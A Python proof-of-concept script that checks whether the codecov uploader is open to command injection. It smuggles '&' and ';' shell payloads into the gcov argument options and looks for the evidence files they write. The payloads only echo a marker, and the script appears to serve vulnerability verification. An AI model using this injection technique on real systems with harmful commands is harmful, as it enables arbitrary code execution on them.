import os
import subprocess
import sys

# This script sequentially tests for command injection vulnerabilities
# using both ampersand ('&') and semicolon (';') payloads.
# Verification is strict, checking if evidence files exist and are non-empty.

# Define the test cases
test_cases = [
    {
        "name": "Ampersand (&) Injection",
        "char": "&",
        "evidence_files": ['vuln_amp_args.txt', 'vuln_amp_exec.txt', 'vuln_amp_root.txt'],
    },
    {
        "name": "Semicolon (;) Injection",
        "char": ";",
        "evidence_files": ['vuln_semi_args.txt', 'vuln_semi_exec.txt', 'vuln_semi_root.txt'],
    }
]

overall_vulnerable = False

# Loop through each test case
for test in test_cases:
    print(f"\n----- Starting Test: {test['name']} -----")

    # 1. Clean up artifacts for the current test
    print("[*] Cleaning up environment for this test...")
    for f in test['evidence_files']:
        if os.path.exists(f):
            os.remove(f)

    # 2. Construct the payloads using the specified character
    payload_args = f"{test['char']} echo PWNED > {test['evidence_files'][0]}"
    payload_exec = f"{test['char']} echo PWNED > {test['evidence_files'][1]}"
    payload_root = f"{test['char']} echo PWNED > {test['evidence_files'][2]}"
    command = (
        f"python -m codecov "
        f"--gcov-args='{payload_args}' "
        f"--gcov-exec='{payload_exec}' "
        f"--gcov-root='{payload_root}' "
        f"-t 'poc-token'"
    )

    # 3. Execute the exploit command
    print(f"[*] Executing exploit command...")
    subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # 4. Verify the result strictly (file must exist and be non-empty)
    print("[*] Verifying result (file must exist and be non-empty)...")
    success = any(os.path.exists(f) and os.path.getsize(f) > 0 for f in test['evidence_files'])

    # 5. Report the result for this specific test
    if success:
        print(f"[+] Result for {test['name']}: SUCCESS")
        overall_vulnerable = True
    else:
        print(f"[-] Result for {test['name']}: FAILURE")

# Print the final, overall conclusion after all tests are run
print("\n======== FINAL CONCLUSION ========")
if overall_vulnerable:
    print("[!] Target is VULNERABLE to at least one injection method.")
    sys.exit(0)  # Exit code 0 indicates a vulnerability was found
else:
    print("[+] Target is NOT VULNERABLE to the tested methods.")
    sys.exit(1)  # Exit code 1 indicates no vulnerability was found
